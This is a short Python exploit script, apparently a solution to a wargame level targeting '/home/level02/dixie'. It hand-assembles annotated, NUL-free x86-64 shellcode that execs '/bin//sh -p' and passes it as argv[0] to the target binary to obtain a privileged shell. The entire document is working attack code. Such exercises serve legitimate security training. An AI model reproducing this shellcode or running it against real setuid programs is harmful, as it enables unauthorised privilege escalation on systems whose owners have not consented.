import os, sys
sc = bytes.fromhex(
    "31f656"                     # xor esi,esi ; push rsi          (NUL)
    "48bb2f62696e2f2f7368"       # movabs rbx,"/bin//sh"          (no NUL)
    "53"                         # push rbx                       (path)
    "545f"                       # push rsp ; pop rdi             (rdi = path)
    "31c0"                       # xor eax,eax
    "66b82d70"                   # mov ax,"-p"
    "50"                         # push rax                       ("-p" string)
    "56"                         # push rsi                       (NULL)
    "488d442408"                 # lea rax,[rsp+8]                (&"-p")
    "50"                         # push rax                       (argv[1])
    "57"                         # push rdi                       (argv[0])
    "4889e6"                     # mov rsi,rsp                    (argv)
    "31d2"                       # xor edx,edx                    (envp=NULL)
    "31c0b03b"                   # xor eax,eax ; mov al,59
    "0f05"                       # syscall
)
assert b"\x00" not in sc, "NUL in shellcode!"
print(f"[*] launcher: shellcode {len(sc)} bytes, argv[0] set", file=sys.stderr)
os.execve("/home/level02/dixie", [sc], {})
